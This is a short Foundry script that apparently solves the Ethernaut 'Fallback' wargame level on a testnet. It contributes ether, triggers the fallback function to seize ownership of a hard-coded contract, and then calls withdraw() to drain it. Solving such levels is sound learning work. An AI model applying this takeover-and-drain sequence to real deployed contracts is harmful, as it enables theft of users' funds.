// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut/Token/TokenHacker.sol";
import "forge-std/console.sol";

//Execute
//forge script script/Fallback.s.sol:FallbackScript --rpc-url $RINKEBY_RPC_URL --broadcast --private-key $PRIVATE_KEY --verify --etherscan-api-key $ETHERSCAN_KEY
   
contract FallbackScript is Script {
    function setUp() public {}

    function run() public {

        console.log("####1");
        vm.startBroadcast();
        console.log(msg.sender);
        address contractToHack = 0xCFef7d3829B3b40ceE0cEEF6445d24f696Cd92e3;
        contractToHack.call{value: 0.0009 ether}(abi.encodeWithSignature("contribute()"));
        contractToHack.call{value: 1 wei}(abi.encodeWithSignature(""));
        contractToHack.call(abi.encodeWithSignature("withdraw()"));
        
        console.log("####3");
        vm.stopBroadcast();
        
        console.log("####4");
    }
}
